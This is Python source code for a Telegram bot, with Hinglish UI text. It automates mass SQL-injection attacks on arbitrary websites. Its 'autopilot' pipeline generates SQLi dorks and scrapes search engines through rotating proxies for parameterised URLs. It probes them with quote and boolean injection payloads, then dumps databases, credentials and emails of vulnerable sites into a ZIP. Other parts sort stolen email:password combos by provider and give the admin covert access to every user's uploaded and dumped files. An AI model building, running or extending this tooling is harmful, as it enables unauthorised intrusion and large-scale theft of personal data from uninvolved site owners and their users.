                f"`L{i}` {icon} *{r.get('name','?')}* (`{r.get('uid')}`) — `{r.get('filename','')[:28]}` (`{_v9_fmt_bytes(r.get('size',0))}`)"
            )
    else:
        lines.append("_Abhi vault khali hai — jaise hi koi user ya aap file upload/generate karoge, turant yahan dikhegi!_")

    rows = []
    if latest5:
        rows.append([
            InlineKeyboardButton(f"⬇️ L{i}", callback_data=f"uv_dl_{r['id']}")
            for i, r in enumerate(latest5, 1)
        ])

    for u in chunk:
        tot_u = u["in"] + u["out"]
        uname_tag = f" @{u['username']}" if u["username"] else ""
        label = f"👤 {u['name'][:14]}{uname_tag[:12]} ({tot_u} files | {_v9_fmt_bytes(u['bytes'])})"
        rows.append([InlineKeyboardButton(label[:60], callback_data=f"uv_u_{u['uid']}_A_0")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"uv_home_{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"uv_home_{page+1}"))
    if nav:
        rows.append(nav)

    rows.append([
        InlineKeyboardButton("🔄 Refresh Vault", callback_data=f"uv_home_{page}"),
        InlineKeyboardButton("⬅️ Admin Panel", callback_data="admin_panel"),
    ])
    return "\n".join(lines), InlineKeyboardMarkup(rows)


def _v9_build_user_files_view(uid: int, flt: str = "A", page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    uid = int(uid)
    all_u = [r for r in _V9_VAULT_INDEX if int(r.get("uid", 0)) == uid]
    all_u.reverse()  # Newest first
    if flt == "I":
        filtered = [r for r in all_u if r.get("dir") == "IN"]
    elif flt == "O":
        filtered = [r for r in all_u if r.get("dir") == "OUT"]
    else:
        flt = "A"
        filtered = all_u

    name, uname = _v9_user_meta_lookup(uid)
    in_cnt = sum(1 for r in all_u if r.get("dir") == "IN")
    out_cnt = sum(1 for r in all_u if r.get("dir") == "OUT")
    tot_sz = sum(int(r.get("size", 0)) for r in all_u)

    per_page = 6
    max_page = max(0, (len(filtered) - 1) // per_page)
    page = max(0, min(page, max_page))
    page_items = filtered[page * per_page : (page + 1) * per_page]

    lines = [
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎",
        f"👤 *Usᴇʀ Fɪʟᴇs:* {_v9_md_safe(name)}",
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎",
        f"🆔 ID: `{uid}`" + (f" • `@{uname}`" if uname else ""),
        f"📊 Total: `{len(all_u)}` (`{_v9_fmt_bytes(tot_sz)}`) | 📥 Uploads: `{in_cnt}` | 📤 Outputs: `{out_cnt}`",
        f"📑 Page `{page+1}/{max_page+1}` — Tap button below to Download (`⬇️`) or Preview (`👁️`):\n",
    ]

    if not page_items:
        lines.append("_Is filter me abhi koi file nahi hai._")
    else:
        for i, r in enumerate(page_items, 1):
            icon = "📥" if r.get("dir") == "IN" else "📤"
            ln_info = f" • `{r['lines']:,} lines`" if r.get("lines") else ""
            lines.append(
                f"*#{i}.* {icon} `{r.get('filename','file')[:40]}`\n"
                f"   └ `{_v9_fmt_bytes(r.get('size',0))}`{ln_info} • `{r.get('ts','')[5:16]}`"
            )

    rows = [
        [
            InlineKeyboardButton(f"{'✅ ' if flt=='A' else ''}All ({len(all_u)})", callback_data=f"uv_u_{uid}_A_0"),
            InlineKeyboardButton(f"{'✅ ' if flt=='I' else ''}📥 In ({in_cnt})", callback_data=f"uv_u_{uid}_I_0"),
            InlineKeyboardButton(f"{'✅ ' if flt=='O' else ''}📤 Out ({out_cnt})", callback_data=f"uv_u_{uid}_O_0"),
        ]
    ]

    if page_items:
        dl_row1 = [InlineKeyboardButton(f"⬇️ #{i}", callback_data=f"uv_dl_{r['id']}") for i, r in enumerate(page_items[:3], 1)]
        rows.append(dl_row1)
        if len(page_items) > 3:
            dl_row2 = [InlineKeyboardButton(f"⬇️ #{i}", callback_data=f"uv_dl_{r['id']}") for i, r in enumerate(page_items[3:], 4)]
            rows.append(dl_row2)
        pv_row = [InlineKeyboardButton(f"👁️ #{i}", callback_data=f"uv_pv_{r['id']}") for i, r in enumerate(page_items[:4], 1)]
        rows.append(pv_row)

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"uv_u_{uid}_{flt}_{page-1}"))
    if page < max_page:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"uv_u_{uid}_{flt}_{page+1}"))
    if nav:
        rows.append(nav)

    rows.append([
        InlineKeyboardButton("📦 Download ALL User Files (.ZIP)", callback_data=f"uv_zip_{uid}"),
    ])
    rows.append([
        InlineKeyboardButton("⬅️ All Users Vault", callback_data="uv_home_0"),
        InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel"),
    ])
    return "\n".join(lines), InlineKeyboardMarkup(rows)


async def _v9_send_vault_file_to_admin(query, context: ContextTypes.DEFAULT_TYPE, fid: str, preview_only: bool = False) -> None:
    rec = _v9_get_vault_record(fid)
    if not rec:
        await query.answer("❌ File record not found!", show_alert=True)
        return

    admin_id = query.from_user.id
    disk_path = rec.get("path") or ""
    has_disk = bool(disk_path and _v9_os.path.isfile(disk_path))

    if preview_only:
        raw = None
        if has_disk:
            raw = _v9_Path(disk_path).read_bytes()
        elif rec.get("tg_file_id"):
            fobj = await context.bot.get_file(rec["tg_file_id"])
            raw = bytes(await fobj.download_as_bytearray())
        if not raw:
            await query.answer("❌ File content unavailable for preview.", show_alert=True)
            return
        preview_txt = ""
        if rec["filename"].lower().endswith(".zip") or raw[:4] == b"PK\x03\x04":
            with _v9_zipfile.ZipFile(_v9_io.BytesIO(raw), "r") as zf:
                listing = [f"• {zi.filename} ({_v9_fmt_bytes(zi.file_size)})" for zi in zf.infolist()[:25]]
                first_txt = ""
                for zi in zf.infolist():
                    if not zi.is_dir():
                        first_txt = "\n".join(zf.read(zi.filename).decode("utf-8", "ignore").splitlines()[:15])
                        break
                preview_txt = "📦 ZIP Contents:\n" + "\n".join(listing) + ("\n\n--- Sample ---\n" + first_txt if first_txt else "")
        else:
            preview_txt = "\n".join(raw.decode("utf-8", errors="ignore").splitlines()[:25])

        await query.answer("👁️ Sending Preview...")
        safe_body = _v9_html.escape(preview_txt[:3400] or "(empty file)")
        await context.bot.send_message(
            chat_id=admin_id,
            text=(
                f"👁️ <b>Preview:</b> <code>{_v9_html.escape(rec['filename'])}</code>\n"
                f"👤 User: <b>{_v9_html.escape(rec['name'])}</b> (<code>{rec['uid']}</code>)\n\n"
                f"<pre>{safe_body}</pre>"
            ),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("⬇️ Download Full File", callback_data=f"uv_dl_{fid}"),
            ]]),
        )
        return

    await query.answer(f"📤 Sending {rec['filename'][:28]}...")
    cap = (
        f"📂 *Admin Vault Access*\n"
        f"👤 User: *{rec['name']}* (`{rec['uid']}`)\n"
        f"📌 Type: `{'UPLOADED INPUT' if rec['dir']=='IN' else 'GENERATED / DUMPED OUTPUT'}`\n"
        f"🕒 Time: `{rec['ts']}` | Size: `{_v9_fmt_bytes(rec['size'])}`"
    )
    # Fastest path: instant Telegram server-side file_id forward (0.1s even for 48MB!)
    if rec.get("tg_file_id"):
        try:
            await context.bot.send_document(
                chat_id=admin_id,
                document=rec["tg_file_id"],
                caption=cap,
                parse_mode=ParseMode.MARKDOWN,
                _v9_skip_vault=True,
            )
            return
        except Exception:
            pass

    if has_disk:
        with open(disk_path, "rb") as fp:
            await context.bot.send_document(
                chat_id=admin_id,
                document=fp,
                filename=rec["filename"],
                caption=cap,
                parse_mode=ParseMode.MARKDOWN,
                read_timeout=300,
                write_timeout=300,
                _v9_skip_vault=True,
            )
        return

    await query.answer("❌ File expired from local cache.", show_alert=True)


async def _v9_send_user_full_zip(query, context: ContextTypes.DEFAULT_TYPE, uid: int) -> None:
    recs = [r for r in _V9_VAULT_INDEX if int(r.get("uid", 0)) == int(uid) and r.get("path") and _v9_os.path.isfile(r["path"])]
    if not recs:
        await query.answer("⚠️ Local disk files for ZIP bundle not found yet — download individual files via ⬇️ buttons!", show_alert=True)
        return
    await query.answer("📦 Packing User Archive .ZIP...")
    buf = _v9_io.BytesIO()
    added = 0
    total_raw = 0
    with _v9_zipfile.ZipFile(buf, "w", compression=_v9_zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
        for r in recs[-60:]:
            p = _v9_Path(r["path"])
            if p.exists() and total_raw + p.stat().st_size <= 140 * 1024 * 1024:
                sub = "01_Uploaded_Inputs" if r.get("dir") == "IN" else "02_Generated_Outputs"
                zf.write(str(p), arcname=f"{sub}/{p.name}")
                total_raw += p.stat().st_size
                added += 1
    buf.seek(0)
    name, _ = _v9_user_meta_lookup(uid)
    await context.bot.send_document(
        chat_id=query.from_user.id,
        document=buf,
        filename=f"UserVault_{uid}_{datetime.now().strftime('%d%m%y_%H%M%S')}.zip",
        caption=f"📦 *Full User Vault Archive*\n👤 User: *{name}* (`{uid}`)\n📄 Packed Files: `{added}` (`{_v9_fmt_bytes(total_raw)}`)",
        parse_mode=ParseMode.MARKDOWN,
        read_timeout=300,
        write_timeout=300,
        _v9_skip_vault=True,
    )


async def userfiles_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Admin Only.")
        return MENU
    if context.args and context.args[0].strip().lstrip("-").isdigit():
        target = int(context.args[0].strip())
        txt, kb = _v9_build_user_files_view(target, "A", 0)
    else:
        txt, kb = _v9_build_vault_home(0)
    await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
    return MENU


# ══════════════════════════════════════════════════════════════════════════════
# 🚀 KILLER FEATURE #1: 1-CLICK END-TO-END AUTO-PILOT PIPELINE (`/autopilot`)
# ══════════════════════════════════════════════════════════════════════════════
_V9_AUTOPILOT_PROFILES = {
    "blitz": {"label": "⚡ Fast Blitz",   "kw": 120, "dorks": 80,  "max_urls": 250},
    "pro":   {"label": "🔥 Balanced Pro", "kw": 350, "dorks": 220, "max_urls": 700},
    "beast": {"label": "☢️ Full Beast",   "kw": 800, "dorks": 600, "max_urls": 2000},
}

_V9_PARAM_URL_RE = _v9_re.compile(r"^https?://[^\s\"'<>]+\?[^\s\"'<>]+=[^\s\"'<>]+", _v9_re.I)
_V9_SKIP_DOMAINS = (
    "google.", "bing.", "yahoo.", "duckduckgo.", "brave.com", "youtube.", "facebook.",
    "instagram.", "twitter.", "x.com", "linkedin.", "reddit.", "wikipedia.", "github.",
    "microsoft.", "apple.com", "amazon.", "cloudflare.", "stackoverflow.", "tiktok.",
)


async def _v9_autopilot_search_dorks(dorks: list[str], stop_ev: asyncio.Event, status_cb=None, max_urls: int = 700) -> list[str]:
    """Multi-Engine (DuckDuckGo HTML + Lite + Bing + Yahoo + Brave) High-Concurrency URL Harvester."""
    found_urls: list[str] = []
    seen_sig: set[str] = set()
    sem = asyncio.Semaphore(36)
    done = 0

    def _harvest_hrefs(html_text: str) -> list[str]:
        out = []
        # Extract uddg= encoded links + direct http(s) links
        for m in _v9_re.findall(r'uddg=(https?%3A%2F%2F[^&"\'<>]+)', html_text, _v9_re.I):
            out.append(_v9_urlparse.unquote(m))
        for m in _v9_re.findall(r'href=["\'](https?://[^"\'<>]+)["\']', html_text, _v9_re.I):
            out.append(_v9_html.unescape(m))
        return out

    async def _worker(dork: str):
        nonlocal done
        if stop_ev.is_set() or len(found_urls) >= max_urls:
            return
        q = _v9_urlparse.quote_plus(dork)
        engines = [
            f"https://html.duckduckgo.com/html/?q={q}",
            f"https://www.bing.com/search?q={q}&count=30",
            f"https://search.yahoo.com/search?p={q}&n=30",
            f"https://search.brave.com/search?q={q}",
        ]
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
        }
        async with sem:
            for eng_url in engines:
                if stop_ev.is_set() or len(found_urls) >= max_urls:
                    break
                px = random.choice(global_proxy_pool) if global_proxy_pool else None
                st, body = await _fetch_via_proxy(eng_url, proxy_str=px, headers=headers, timeout=9.0)
                if st == 200 and body and len(body) > 400:
                    added_here = 0
                    for raw_u in _harvest_hrefs(body):
                        u = raw_u.strip()
                        if not _V9_PARAM_URL_RE.match(u):
                            continue
                        parsed = _v9_urlparse.urlsplit(u)
                        host = (parsed.hostname or "").lower()
                        if not host or any(b in host for b in _V9_SKIP_DOMAINS):
                            continue
                        param_names = ",".join(sorted(k for k, _ in _v9_urlparse.parse_qsl(parsed.query)))
                        sig = f"{host}{parsed.path}?{param_names}"
                        if sig in seen_sig:
                            continue
                        seen_sig.add(sig)
                        found_urls.append(u)
                        added_here += 1
                        if len(found_urls) >= max_urls:
                            break
                    if added_here >= 3:
                        break
            done += 1
            if status_cb and (done % 5 == 0 or done == len(dorks)):
                await status_cb(done, len(dorks), len(found_urls))

    await asyncio.gather(*(_worker(d) for d in dorks), return_exceptions=True)
    return found_urls


async def _v9_autopilot_scan_sqli(urls: list[str], stop_ev: asyncio.Event, status_cb=None) -> list[str]:
    """High-Precision Differential + Error + Boolean SQLi Verifier across all 12 cores."""
    # Prefer V5 12-core scanner if present in bot_fixed.py; otherwise fast async multi-check
    if "run_mass_sqli_12core" in globals():
        async def _p_cb(done, total, vulns):
            if status_cb:
                await status_cb(done, total, vulns)
        res = await run_mass_sqli_12core(urls, progress_cb=_p_cb, stop_event=stop_ev)
        if isinstance(res, tuple):
            return list(res[0])
        return list(res or [])

    vulns: list[str] = []
    sem = asyncio.Semaphore(80)
    done = 0
    err_re = _v9_re.compile(
        r"(you have an error in your sql syntax|warning:\s*mysql|mysql_fetch|mysqli_|"
        r"pg_query|unterminated quoted string|odbc sql server|ora-\d{5}|sqlite3::|pdoexception|sqlstate\[)",
        _v9_re.I,
    )

    async def _scan_one(u: str):
        nonlocal done
        if stop_ev.is_set():
            return
        async with sem:
            px = random.choice(global_proxy_pool) if global_proxy_pool else None
            st0, b0 = await _fetch_via_proxy(u, proxy_str=px, timeout=8.0)
            st1, b1 = await _fetch_via_proxy(u + "'", proxy_str=px, timeout=8.0)
            if st1 == 200 and b1 and err_re.search(b1) and not (b0 and err_re.search(b0)):
                vulns.append(u)
            elif st0 == 200 and b0 and len(b0) > 120:
                _, bt = await _fetch_via_proxy(u + "%20AND%201=1", proxy_str=px, timeout=8.0)
                _, bf = await _fetch_via_proxy(u + "%20AND%201=2", proxy_str=px, timeout=8.0)
                if bt and bf and abs(len(bt) - len(b0)) < max(40, int(len(b0) * 0.04)) and abs(len(bf) - len(bt)) > max(120, int(len(bt) * 0.12)):
                    vulns.append(u)
            done += 1
            if status_cb and (done % 10 == 0 or done == len(urls)):
                await status_cb(done, len(urls), len(vulns))

    await asyncio.gather(*(_scan_one(u) for u in urls), return_exceptions=True)
    return vulns


async def _v9_run_autopilot_pipeline(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_input: str) -> int:
    user = update.effective_user
    uid = user.id
    mode_key = context.user_data.get("ap_mode", "pro")
    prof = _V9_AUTOPILOT_PROFILES.get(mode_key, _V9_AUTOPILOT_PROFILES["pro"])

    stop_ev = asyncio.Event()
    stop_events[uid] = stop_ev
    stop_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop Auto-Pilot", callback_data="stop_autopilot")]])

    msg_target = update.effective_message
    status_msg = await msg_target.reply_text(
        f"🚀 *Aᴜᴛᴏ-Pɪʟᴏᴛ Pɪᴘᴇʟɪɴᴇ — Sᴛᴀʀᴛɪɴɢ ({prof['label']})*\n"
        f"⏳ Initializing 5-Stage Autonomous Engine...",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=stop_kb,
    )

    lines = [ln.strip() for ln in raw_input.splitlines() if ln.strip()]
    has_http = sum(1 for ln in lines if ln.startswith(("http://", "https://")))
    has_dork = sum(1 for ln in lines if any(op in ln.lower() for op in ("inurl:", "intitle:", "site:", "filetype:")))

    _LIVE_FEED[uid] = {
        "name": user.first_name or str(uid),
        "start": datetime.now().strftime("%H:%M:%S"),
        "dorks_total": prof["dorks"],
        "dorks_done": 0,
        "urls_found": 0,
        "phase": "🚀 Auto-Pilot Stage 1",
    }

    try:
        # Ensure live proxy pool before parsing/scanning
        if len(global_proxy_pool) < 150 and "refill_proxy_pool_to_target" in globals():
            await status_msg.edit_text("🌊 *Stage 0/5:* Warming up Verified Multi-Protocol Proxies...", parse_mode=ParseMode.MARKDOWN, reply_markup=stop_kb)
            await refill_proxy_pool_to_target(target_override=min(400, get_min_proxy_target()))

        urls_to_scan: list[str] = []
        dorks_to_parse: list[str] = []

        if has_http >= max(1, len(lines) // 2):
            urls_to_scan = [ln for ln in lines if ln.startswith(("http://", "https://"))]
        elif has_dork >= max(1, len(lines) // 2):
            dorks_to_parse = lines[: max(prof["dorks"], len(lines))]
        else:
            # Stage 1: Niche Keyword Expansion
            _LIVE_FEED[uid]["phase"] = "🚀 Stage 1/5 • Keywords"
            await status_msg.edit_text(f"🔑 *Stage 1/5:* Expanding `{prof['kw']:,}` Topic-Pure Keywords...", parse_mode=ParseMode.MARKDOWN, reply_markup=stop_kb)
            kws = await asyncio.to_thread(generate_keywords, lines, prof["kw"])
            await v8_deliver_lines_guaranteed(msg_target, None, kws, "autopilot_stage1_keywords", "🚀 *Auto-Pilot Stage 1/5 — Clean Keywords*")

            # Stage 2: High-Hit SQLi Dorks
            if not stop_ev.is_set():
                _LIVE_FEED[uid]["phase"] = "🚀 Stage 2/5 • HQ Dorks"
                await status_msg.edit_text(f"🎯 *Stage 2/5:* Generating `{prof['dorks']:,}` High-Hit SQLi Dorks...", parse_mode=ParseMode.MARKDOWN, reply_markup=stop_kb)
                half = prof["dorks"] // 2
                d1 = await asyncio.to_thread(generate_hq_sqli_dorks, kws, half)
                d2 = await asyncio.to_thread(generate_dorks, kws, prof["dorks"] - half)
                dorks_to_parse = list(dict.fromkeys(d1 + d2))[: prof["dorks"]]
                await v8_deliver_lines_guaranteed(msg_target, None, dorks_to_parse, "autopilot_stage2_dorks", "🚀 *Auto-Pilot Stage 2/5 — High-Hit SQLi Dorks*")

        # Stage 3: Multi-Engine Deep URL Parser
        if dorks_to_parse and not stop_ev.is_set():
            _LIVE_FEED[uid]["phase"] = "🚀 Stage 3/5 • Parsing URLs"
            _LIVE_FEED[uid]["dorks_total"] = len(dorks_to_parse)
            last_t = [0.0]

            async def _p_status(done, tot, found):
                _LIVE_FEED[uid]["dorks_done"] = done
                _LIVE_FEED[uid]["urls_found"] = found
                now = _v9_time.monotonic()
                if now - last_t[0] >= 2.5:
                    last_t[0] = now
                    try:
                        await status_msg.edit_text(
                            f"🔍 *Stage 3/5 — Multi-Engine URL Harvester*\n"
                            f"📊 Dorks: `{done:,}/{tot:,}` | 🎯 Clean Param URLs: `{found:,}`\n"
                            f"🌊 Live Proxies: `{len(global_proxy_pool):,}`",
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=stop_kb,
                        )
                    except Exception:
                        pass

            urls_to_scan = await _v9_autopilot_search_dorks(dorks_to_parse, stop_ev, _p_status, max_urls=prof["max_urls"])
            if urls_to_scan:
                await v8_deliver_lines_guaranteed(msg_target, None, urls_to_scan, "autopilot_stage3_param_urls", f"🚀 *Auto-Pilot Stage 3/5 — {len(urls_to_scan):,} Clean Param URLs*")

        if not urls_to_scan:
            await status_msg.edit_text("⚠️ *Auto-Pilot Completed Stage 1–3:* No injectable `?param=` URLs returned for these seeds yet — try broader niche seeds or **🔥 Pro / ☢️ Beast** mode!", parse_mode=ParseMode.MARKDOWN)
            return MENU

        # Stage 4: Differential Multi-Check SQLi Scanner
        vuln_urls: list[str] = []
        if not stop_ev.is_set():
            _LIVE_FEED[uid]["phase"] = "🚀 Stage 4/5 • SQLi Scan"
            _LIVE_FEED[uid]["dorks_total"] = len(urls_to_scan)
            last_s = [0.0]

            async def _s_status(done, tot, vulns_cnt):
                _LIVE_FEED[uid]["dorks_done"] = done
                _LIVE_FEED[uid]["urls_found"] = vulns_cnt
                now = _v9_time.monotonic()
                if now - last_s[0] >= 2.5:
                    last_s[0] = now
                    try:
                        await status_msg.edit_text(
                            f"💉 *Stage 4/5 — Differential SQLi Verifier*\n"
                            f"🧪 Scanned: `{done:,}/{tot:,}` | 🔥 Confirmed Vuln: `{vulns_cnt:,}`",
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=stop_kb,
                        )
                    except Exception:
                        pass

            vuln_urls = await _v9_autopilot_scan_sqli(urls_to_scan, stop_ev, _s_status)
            if vuln_urls:
                await v8_deliver_lines_guaranteed(msg_target, None, vuln_urls, "autopilot_stage4_vuln_urls", f"🔥 *Auto-Pilot Stage 4/5 — {len(vuln_urls):,} Confirmed Vulnerable URLs!*")

        if not vuln_urls:
            await status_msg.edit_text(
                f"✅ *Auto-Pilot Finished Stages 1–4!*\n"
                f"• Clean Param URLs Harvested: `{len(urls_to_scan):,}` (delivered above)\n"
                f"• Confirmed Injectable Targets: `0` in this batch.",
                parse_mode=ParseMode.MARKDOWN,
            )
            return MENU

        # Stage 5: Full Multi-Vector ALL Data Dumper -> Structured ZIP!
        if not stop_ev.is_set() and "run_vuln_alldata_dumper" in globals():
            _LIVE_FEED[uid]["phase"] = "🚀 Stage 5/5 • Dumping DBs"
            zip_bytes, summary = await run_vuln_alldata_dumper(vuln_urls, status_msg, stop_ev)
            await msg_target.reply_document(
                document=_v9_io.BytesIO(zip_bytes),
                filename=f"AutoPilot_FullDump_{datetime.now().strftime('%d%m%y_%H%M%S')}.zip",
                caption=(
                    f"🏆 *Aᴜᴛᴏ-Pɪʟᴏᴛ 5/5 COMPLETE — FULL DATA VAULT*\n"
                    f"🎯 Vuln Sites: `{len(vuln_urls)}` | 🗄️ DBs: `{summary.get('total_dbs',0)}` | "
                    f"📋 Rows: `{summary.get('total_rows',0):,}`\n"
                    f"🔑 Creds: `{summary.get('total_creds',0):,}` | 📧 Emails: `{summary.get('total_emails',0):,}`"
                ),
                parse_mode=ParseMode.MARKDOWN,
                read_timeout=300,
                write_timeout=300,
            )
    finally:
        _LIVE_FEED.pop(uid, None)
        stop_events.pop(uid, None)

    return MENU


def _v9_autopilot_menu_text(mode_key: str = "pro") -> str:
    p = _V9_AUTOPILOT_PROFILES.get(mode_key, _V9_AUTOPILOT_PROFILES["pro"])
    return (
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎\n"
        "🚀 *1-Cʟɪᴄᴋ Aᴜᴛᴏ-Pɪʟᴏᴛ Pɪᴘᴇʟɪɴᴇ*\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        "⚡ *100% Hands-Free End-to-End 5-Stage Factory:*\n"
        "`1️⃣ Clean Keywords` ➪ `2️⃣ HQ SQLi Dorks` ➪ `3️⃣ Multi-Engine URL Parser` ➪ `4️⃣ SQLi Verifier` ➪ `5️⃣ ALL-Data .ZIP Dump`!\n\n"
        f"🎚️ *Selected Preset:* *{p['label']}* (`{p['kw']}` KWs • `{p['dorks']}` Dorks • up to `{p['max_urls']}` Param URLs)\n\n"
        "👇 *Ab bas Niche/Topic likh kar bhejo* (jaise `usa real estate leads` ya `ecommerce shop uk`) **YA** seedha `.txt`/`.zip` (Seeds / Dorks / URLs) upload kar do!"
    )


def _v9_autopilot_kb(selected: str = "pro") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"{'✅ ' if selected=='blitz' else ''}⚡ Blitz", callback_data="ap_mode_blitz"),
            InlineKeyboardButton(f"{'✅ ' if selected=='pro' else ''}🔥 Pro", callback_data="ap_mode_pro"),
            InlineKeyboardButton(f"{'✅ ' if selected=='beast' else ''}☢️ Beast", callback_data="ap_mode_beast"),
        ],
        [InlineKeyboardButton("⏪ Back to Main Menu", callback_data="menu_back")],
    ])


async def autopilot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    context.user_data.setdefault("ap_mode", "pro")
    if context.args:
        return await _v9_run_autopilot_pipeline(update, context, " ".join(context.args))
    await update.message.reply_text(
        _v9_autopilot_menu_text(context.user_data["ap_mode"]),
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=_v9_autopilot_kb(context.user_data["ap_mode"]),
    )
    return AUTOPILOT_WAIT_INPUT


async def autopilot_get_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        return MENU
    return await _v9_run_autopilot_pipeline(update, context, update.message.text or "")


async def autopilot_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        return MENU
    raw_text = await _v9_download_and_vault_doc(update, context)
    return await _v9_run_autopilot_pipeline(update, context, raw_text)


# ══════════════════════════════════════════════════════════════════════════════
# 🧰 KILLER FEATURE #2: COMBO, EMAIL & INJECTABLE URL REFINERY (`/cleaner`)
# ══════════════════════════════════════════════════════════════════════════════
_V9_EMAIL_PASS_RE = _v9_re.compile(r"([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,12})\s*[:;|,\t]\s*([^\s:;|,\t]{4,64})")
_V9_PURE_EMAIL_RE = _v9_re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,12}")


def _v9_refinery_process_sync(raw_text: str, mode: str) -> tuple[str, list[str], dict[str, str]]:
    """Process millions of lines cleanly in worker thread."""
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if mode == "param":
        seen = set()
        out = []
        for ln in lines:
            if not _V9_PARAM_URL_RE.match(ln):
                continue
            sp = _v9_urlparse.urlsplit(ln)
            host = (sp.hostname or "").lower()
            if not host or any(b in host for b in _V9_SKIP_DOMAINS):
                continue
            pkeys = ",".join(sorted(k for k, _ in _v9_urlparse.parse_qsl(sp.query)))
            sig = f"{host}{sp.path}?{pkeys}"
            if sig not in seen:
                seen.add(sig)
                out.append(ln)
        return "clean_injectable_urls", out, {}

    if mode == "combo":
        combos = list(dict.fromkeys(f"{m.group(1).lower()}:{m.group(2)}" for m in _V9_EMAIL_PASS_RE.finditer(raw_text)))
        emails = list(dict.fromkeys(m.group(0).lower() for m in _V9_PURE_EMAIL_RE.finditer(raw_text)))
        buckets = {"gmail": [], "outlook_hotmail": [], "yahoo": [], "business_corporate": []}
        src_for_split = combos if combos else emails
        for item in src_for_split:
            dom = item.split("@", 1)[1].split(":", 1)[0].lower()
            if "gmail." in dom or "googlemail." in dom:
                buckets["gmail"].append(item)
            elif any(x in dom for x in ("outlook.", "hotmail.", "live.", "msn.")):
                buckets["outlook_hotmail"].append(item)
            elif "yahoo." in dom or "ymail." in dom:
                buckets["yahoo"].append(item)
            else:
                buckets["business_corporate"].append(item)
        files_map = {
            "01_All_Email_Pass_Combos.txt": "\n".join(combos),
            "02_All_Pure_Unique_Emails.txt": "\n".join(emails),
            "03_Gmail.txt": "\n".join(buckets["gmail"]),
            "04_Outlook_Hotmail.txt": "\n".join(buckets["outlook_hotmail"]),
            "05_Yahoo.txt": "\n".join(buckets["yahoo"]),
            "06_Business_Corporate_B2B.txt": "\n".join(buckets["business_corporate"]),
        }
        return "combo_leads_pack", combos or emails, files_map

    if mode == "domains":
        doms = []
        seen = set()
        for ln in lines:
            u = ln if "://" in ln else f"http://{ln}"
            h = (_v9_urlparse.urlsplit(u).hostname or "").lower()
            if h and "." in h and h not in seen:
                seen.add(h)
                doms.append(h)
        return "unique_domains", doms, {}

    # Default: ultra-fast exact dedup preserving order
    deduped = list(dict.fromkeys(lines))
    return "dedup_cleaned", deduped, {}


def _v9_refinery_kb(selected: str = "param") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"{'✅ ' if selected=='param' else ''}🎯 Injectable URLs", callback_data="rf_mode_param"),
            InlineKeyboardButton(f"{'✅ ' if selected=='dedup' else ''}🧹 Dedup & Clean", callback_data="rf_mode_dedup"),
        ],
        [
            InlineKeyboardButton(f"{'✅ ' if selected=='combo' else ''}📧 Combo/Email Split", callback_data="rf_mode_combo"),
            InlineKeyboardButton(f"{'✅ ' if selected=='domains' else ''}🌐 Unique Domains", callback_data="rf_mode_domains"),
        ],
        [InlineKeyboardButton("⏪ Back to Main Menu", callback_data="menu_back")],
    ])


def _v9_refinery_text(mode: str = "param") -> str:
    labels = {
        "param": "🎯 Filter Injectable Param URLs (1/Endpoint — 10x Faster SQLi!)",
        "dedup": "🧹 Instant Deduplicate + Clean Blank/Corrupt Lines",
        "combo": "📧 Extract `email:pass` + Pure Emails + Gmail/Outlook/Yahoo/B2B .ZIP",
        "domains": "🌐 Extract Unique Clean Domains List",
    }
    return (
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎\n"
        "🧰 *Cᴏᴍʙᴏ, Lᴇᴀᴅ & URL Rᴇғɪɴᴇʀʏ*\n"
        "✿︎━━━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"⚙️ *Selected Tool:* *{labels.get(mode, labels['param'])}*\n\n"
        "📤 *Ab apni `.txt` ya `.zip` file bhejo* (10 Lakh+ lines supported!) — bot turant clean & sort karke wapas bhej dega!"
    )


async def cleaner_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not has_access(update.effective_user.id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    context.user_data.setdefault("rf_mode", "param")
    await update.message.reply_text(
        _v9_refinery_text(context.user_data["rf_mode"]),
        parse_mode=ParseMode.MARKDOWN,
